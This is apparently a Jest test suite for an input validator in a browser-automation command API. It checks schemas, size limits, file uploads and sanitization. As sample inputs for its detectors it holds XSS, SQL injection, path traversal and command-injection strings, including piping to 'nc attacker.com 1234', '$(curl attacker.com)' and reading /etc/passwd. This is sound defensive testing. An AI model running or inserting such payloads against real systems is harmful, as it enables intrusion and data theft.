/**
 * Input Validator Security Tests
 * Tests for comprehensive input validation hardening
 */

const { InputValidator } = require('../../../src/security/input-validator');

describe('InputValidator - Security Hardening Phase 2', () => {
  let validator;

  beforeEach(() => {
    validator = new InputValidator();
  });

  describe('Basic Request Validation', () => {
    test('should accept valid request', () => {
      const result = validator.validateRequest({
        command: 'navigate',
        params: { url: 'https://example.com' }
      });

      expect(result.valid).toBe(true);
      expect(result.errors.length).toBe(0);
    });

    test('should reject invalid request object', () => {
      const result = validator.validateRequest(null);

      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    test('should reject missing command', () => {
      const result = validator.validateRequest({
        params: { url: 'https://example.com' }
      });

      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.errors[0]).toMatch(/[Cc]ommand/);
    });

    test('should reject non-string command', () => {
      const result = validator.validateRequest({
        command: 123,
        params: {}
      });

      expect(result.valid).toBe(false);
    });

    test('should reject command with invalid characters', () => {
      const result = validator.validateRequest({
        command: 'invalid<script>command',
        params: {}
      });

      expect(result.valid).toBe(false);
    });
  });

  describe('Payload Size Validation', () => {
    test('should reject oversized payload', () => {
      const largePayload = 'x'.repeat(15 * 1024 * 1024); // 15MB

      const result = validator.validateRequest({
        command: 'execute_javascript',
        params: { script: largePayload }
      });

      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('Payload size'))).toBe(true);
    });

    test('should accept payload within limits', () => {
      const payload = 'x'.repeat(10000); // Within 50KB script limit

      const result = validator.validateRequest({
        command: 'execute_javascript',
        params: { script: payload }
      });

      expect(result.valid).toBe(true);
    });
  });

  describe('XSS Protection', () => {
    test('should detect script tag injection', () => {
      const xssPayload = '<script>alert("xss")</script>';
      const check = validator.detectXss(xssPayload);

      expect(check.detected).toBe(true);
    });

    test('should detect javascript: protocol', () => {
      const xssPayload = '<a href="javascript:alert(1)">click</a>';
      const check = validator.detectXss(xssPayload);

      expect(check.detected).toBe(true);
    });

    test('should detect event handler injection', () => {
      const xssPayload = '<img onerror="alert(1)" src=x>';
      const check = validator.detectXss(xssPayload);

      expect(check.detected).toBe(true);
    });

    test('should accept parameter validation without content scanning', () => {
      const result = validator.validateRequest({
        command: 'fill',
        params: {
          selector: 'input',
          value: 'safe text'
        }
      });

      expect(result.valid).toBe(true);
    });

    test('should accept safe HTML', () => {
      const result = validator.validateRequest({
        command: 'fill',
        params: {
          selector: 'input',
          value: 'Hello World 123'
        }
      });

      expect(result.valid).toBe(true);
    });
  });

  describe('SQL Injection Protection', () => {
    test('should detect SQL injection patterns', () => {
      const sqlPayload = "'; DROP TABLE users; --";
      const check = validator.detectSqlInjection(sqlPayload);

      expect(check.detected).toBe(true);
    });

    test('should detect UNION-based injection', () => {
      const sqlPayload = "' UNION SELECT * FROM users --";
      const check = validator.detectSqlInjection(sqlPayload);

      expect(check.detected).toBe(true);
    });

    test('should accept parameters that detect SQL patterns separately', () => {
      const payload = "'; DROP TABLE users; --";
      const result = validator.validateRequest({
        command: 'fill',
        params: {
          selector: 'input',
          value: payload
        }
      });

      // Parameter schema validation passes - SQL detection is separate utility
      expect(result.valid).toBe(true);

      // But SQL detection method works separately
      const sqlCheck = validator.detectSqlInjection(payload);
      expect(sqlCheck.detected).toBe(true);
    });
  });

  describe('Path Traversal Protection', () => {
    test('should detect ../ traversal', () => {
      const check = validator.detectPathTraversal('../../../etc/passwd');

      expect(check.detected).toBe(true);
    });

    test('should detect encoded traversal', () => {
      const check = validator.detectPathTraversal('..%2f..%2fetc%2fpasswd');

      expect(check.detected).toBe(true);
    });

    test('should detect backslash traversal', () => {
      const check = validator.detectPathTraversal('..\\..\\windows\\system32');

      expect(check.detected).toBe(true);
    });
  });

  describe('Command Injection Protection', () => {
    test('should detect shell command injection', () => {
      const check = validator.detectCommandInjection('test; cat /etc/passwd');

      expect(check.detected).toBe(true);
    });

    test('should detect pipe injection', () => {
      const check = validator.detectCommandInjection('test | nc attacker.com 1234');

      expect(check.detected).toBe(true);
    });

    test('should detect command substitution', () => {
      const check = validator.detectCommandInjection('test $(curl attacker.com)');

      expect(check.detected).toBe(true);
    });
  });

  describe('Parameter Schema Validation', () => {
    test('should validate navigate schema', () => {
      const result = validator.validateRequest({
        command: 'navigate',
        params: {
          url: 'https://example.com',
          timeout: 30000,
          waitUntil: 'load'
        }
      });

      expect(result.valid).toBe(true);
    });

    test('should reject invalid URL length', () => {
      const result = validator.validateRequest({
        command: 'navigate',
        params: {
          url: 'https://' + 'x'.repeat(3000) + '.com'
        }
      });

      expect(result.valid).toBe(false);
    });

    test('should validate click schema', () => {
      const result = validator.validateRequest({
        command: 'click',
        params: {
          selector: '#submit-btn',
          count: 1
        }
      });

      expect(result.valid).toBe(true);
    });

    test('should reject invalid count', () => {
      const result = validator.validateRequest({
        command: 'click',
        params: {
          selector: '#submit-btn',
          count: 1000
        }
      });

      expect(result.valid).toBe(false);
    });

    test('should validate proxy schema', () => {
      const result = validator.validateRequest({
        command: 'set_proxy',
        params: {
          type: 'http',
          host: 'proxy.example.com',
          port: 8080
        }
      });

      expect(result.valid).toBe(true);
    });

    test('should reject invalid port', () => {
      const result = validator.validateRequest({
        command: 'set_proxy',
        params: {
          type: 'http',
          host: 'proxy.example.com',
          port: 99999
        }
      });

      expect(result.valid).toBe(false);
    });
  });

  describe('File Upload Validation', () => {
    test('should accept valid file', () => {
      const file = {
        name: 'image.png',
        size: 1024,
        mimetype: 'image/png'
      };

      const result = validator.validateFileUpload(file);

      expect(result.valid).toBe(true);
    });

    test('should reject executable files', () => {
      const file = {
        name: 'malware.exe',
        size: 1024,
        mimetype: 'application/x-msdownload'
      };

      const result = validator.validateFileUpload(file);

      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('extension'))).toBe(true);
    });

    test('should reject path traversal in filename', () => {
      const file = {
        name: '../../../etc/passwd',
        size: 1024,
        mimetype: 'text/plain'
      };

      const result = validator.validateFileUpload(file);

      expect(result.valid).toBe(false);
    });

    test('should reject oversized files', () => {
      const file = {
        name: 'large.bin',
        size: 15 * 1024 * 1024,
        mimetype: 'application/octet-stream'
      };

      const result = validator.validateFileUpload(file);

      expect(result.valid).toBe(false);
    });

    test('should reject invalid MIME types', () => {
      const file = {
        name: 'file.txt',
        size: 1024,
        mimetype: 'application/x-executable'
      };

      const result = validator.validateFileUpload(file);

      expect(result.valid).toBe(false);
    });
  });

  describe('String Sanitization', () => {
    test('should remove null bytes', () => {
      const input = 'test\x00value';
      const sanitized = validator.sanitizeString(input);

      expect(sanitized).not.toContain('\x00');
      expect(sanitized).toBe('testvalue');
    });

    test('should remove control characters', () => {
      const input = 'test\x01\x02\x03value';
      const sanitized = validator.sanitizeString(input);

      expect(sanitized).toBe('testvalue');
    });

    test('should preserve normal text', () => {
      const input = 'Hello World 123!';
      const sanitized = validator.sanitizeString(input);

      expect(sanitized).toBe('Hello World 123!');
    });

    test('should truncate oversized strings', () => {
      const input = 'x'.repeat(2 * 1024 * 1024);
      const sanitized = validator.sanitizeString(input);

      expect(sanitized.length).toBeLessThanOrEqual(1024 * 1024);
    });
  });

  describe('Content-Type Validation', () => {
    test('should accept valid JSON content-type', () => {
      const result = validator.validateContentType('application/json');

      expect(result.valid).toBe(true);
      expect(result.matches).toBe('application/json');
    });

    test('should accept content-type with charset', () => {
      const result = validator.validateContentType('application/json; charset=utf-8');

      expect(result.valid).toBe(true);
    });

    test('should reject invalid content-type', () => {
      const result = validator.validateContentType('application/x-executable');

      expect(result.valid).toBe(false);
    });
  });

  describe('Security Report', () => {
    test('should generate security report', () => {
      const report = validator.getSecurityReport();

      expect(report.enabled).toBe(true);
      expect(report.maxPayloadSize).toBeGreaterThan(0);
      expect(report.protections.xss).toBe(true);
      expect(report.protections.sqlInjection).toBe(true);
      expect(report.protections.pathTraversal).toBe(true);
      expect(report.protections.commandInjection).toBe(true);
    });

    test('should report command schemas', () => {
      const report = validator.getSecurityReport();

      expect(report.commandSchemas).toBeGreaterThan(0);
    });
  });

  describe('Edge Cases', () => {
    test('should handle deeply nested objects', () => {
      const nested = { command: 'test', params: {} };
      let current = nested.params;

      for (let i = 0; i < 15; i++) {
        current.deep = {};
        current = current.deep;
      }

      const result = validator.validateRequest(nested);

      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('depth'))).toBe(true);
    });

    test('should handle empty objects', () => {
      const result = validator.validateRequest({});

      expect(result.valid).toBe(false);
    });

    test('should handle special characters in keys', () => {
      const errors = validator.validateObjectTypes({
        'key-with-dash': 'value',
        'key@special': 'value'
      });

      expect(errors.length).toBeGreaterThan(0);
    });
  });
});
